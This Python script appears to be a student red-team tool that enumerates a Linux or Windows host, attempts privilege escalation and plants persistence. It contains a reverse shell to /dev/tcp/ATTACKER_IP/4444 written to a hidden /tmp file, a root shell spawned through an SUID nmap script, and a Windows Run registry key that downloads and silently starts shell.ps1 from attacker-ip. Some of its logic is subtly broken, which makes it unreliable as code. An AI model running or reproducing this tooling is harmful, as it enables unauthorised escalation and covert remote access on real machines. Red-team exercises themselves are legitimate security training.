#Sebastian Hernandez
#srh5868@rit.edu
#Team Foxtrot 

import os
import subprocess

# Function to execute shell commands and return output
def run_command(command):
    # Executes a shell command and returns the output
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return str(e)

# Function to detect the operating system
def detect_os():
    # Detects whether the system is Windows or Linux
    if os.name == 'nt':
        return 'Windows'
    else:
        return 'Linux'

# Function to gather system information based on the OS
def enumerate_system():
    # Gathers basic system information such as hostname, users, privilege info, and scheduled jobs 
    os_type = detect_os()
    print(f"Detected OS: {os_type}")
    
    if os_type == 'Linux':
        hostname = run_command("hostname")
        users = run_command("cat /etc/passwd | cut -d: -f1")  # Lists system users
        sudo_rights = run_command("sudo -l")  # Checks sudo privileges
        suid_binaries = run_command("find / -perm -4000 -type f 2>/dev/null")  # Finds SUID binaries
        cron_jobs = run_command("cat /etc/crontab")  # Lists scheduled cron jobs
    else:
        hostname = run_command("hostname")
        users = run_command("net user")  # Lists Windows users
        sudo_rights = run_command("whoami /priv")  # Lists Windows privilege rights
        suid_binaries = run_command("wmic service get name,displayname,pathname | findstr /i 'C:\\Program Files'")  # Finds unquoted service paths
        cron_jobs = run_command("schtasks /query /fo LIST")  # Lists scheduled tasks
    
    # Store and print gathered information
    info = {
        "Hostname": hostname,
        "Users": users,
        "Privilege Info": sudo_rights,
        "Potential Escalation Points": suid_binaries,
        "Scheduled Jobs": cron_jobs
    }
    
    for key, value in info.items():
        print(f"{key}:\n{value}\n")
    
    return info

# Function to check for privilege escalation opportunities
def privilege_escalation():
    # Checks for common privilege escalation techniques based on OS
    os_type = detect_os()
    print("Checking for privilege escalation opportunities...")
    
    # Check if already running as root or administrator
    if os.geteuid() == 0 if os_type == 'Linux' else run_command("whoami /groups").count('S-1-5-32-544') > 0:
        print("Already running as root/Admin!")
        return True
    
    if os_type == 'Linux':
        # Check for sudo privileges without a password
        sudo_check = run_command("sudo -n -l 2>/dev/null")
        if "(ALL) NOPASSWD: ALL" in sudo_check:
            print("Sudo without password detected! Attempting escalation...")
            run_command("sudo su")
            return True
        
        # Check for exploitable SUID binaries
        suid_bins = run_command("find / -perm -4000 -type f 2>/dev/null").split('\n')
        for bin in suid_bins:
            if "nmap" in bin:
                print("Nmap with SUID detected! Escalating...")
                run_command("echo 'os.execute(\"/bin/sh\")' | nmap --script=/dev/stdin")
                return True
    else:
        # Check for unquoted service paths in Windows (potential privilege escalation)
        unquoted_service = run_command("wmic service get name,displayname,pathname | findstr /i 'C:\\Program Files'")
        if unquoted_service:
            print("Unquoted service path detected! Potential escalation.")
        
    print("No easy privilege escalation found.")
    return False

# Function to maintain access on the system
def maintain_access():
    # Sets up a backdoor for persistence based on the OS
    os_type = detect_os()
    print("Setting up a simple backdoor...")
    
    if os_type == 'Linux':
        # Creates a reverse shell backdoor in /tmp directory
        backdoor = "echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/.backdoor.sh && chmod +x /tmp/.backdoor.sh"
    else:
        # Adds a registry entry for persistence on Windows
        backdoor = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d 'powershell -exec bypass -w hidden -c \"Invoke-WebRequest -Uri http://attacker-ip/shell.ps1 -OutFile C:\\Windows\\Temp\\shell.ps1; Start-Process C:\\Windows\\Temp\\shell.ps1\"'"
    
    run_command(backdoor)
    print("Backdoor created.")

# Main function to execute the script
def main():
    enumerate_system()
    if privilege_escalation():
        print("Privilege escalation successful!")
    maintain_access()
    print("Red Team tool execution completed!")
    
if __name__ == "__main__":
    main()
